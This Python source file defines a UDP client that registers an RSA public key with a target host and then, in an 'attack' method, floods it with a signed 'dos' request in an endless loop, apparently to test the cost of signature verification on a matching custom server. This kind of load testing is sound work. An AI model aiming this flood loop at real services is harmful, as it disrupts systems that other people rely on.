import socket
from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
import base64
import datetime

MSG = 'dos'

class Client(object):
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.addr = (host, port)
        self.signature = self._sign(MSG)

    def request(self, msg, sig):
        payload = msg + '|' + sig
        self._send('req', payload)

    def attack(self, msg):
        t0 = datetime.datetime.now()
        n = 0
        try:
            while True:
                self.request(MSG, self.signature)
                n += 1
        except KeyboardInterrupt:
            t1 = datetime.datetime.now()
            d = (t1-t0).total_seconds()
            print()
            print(f"{n} packets sent in {d:.2f}s")

    def _send(self, mtype, payload):
        self.sock.sendto(bytearray(mtype + '|' + payload, 'ascii'), self.addr)

    def _sign(self, msg):
        raise NotImplementedError

class RSAClient(Client):
    def __init__(self, host, port):
        with open('pkey.pem') as f:
            self.pkey = RSA.importKey(f.read())
        with open('skey.pem') as f:
            self.skey = RSA.importKey(f.read())
        super().__init__(host, port)
        self._send('pkey', self.pkey.exportKey().decode('ascii'))

    def _sign(self, msg):
        h = SHA.new(msg.encode('ascii'))
        signer = PKCS1_v1_5.new(self.skey)
        sig = signer.sign(h)
        return base64.b64encode(sig).decode('ascii')

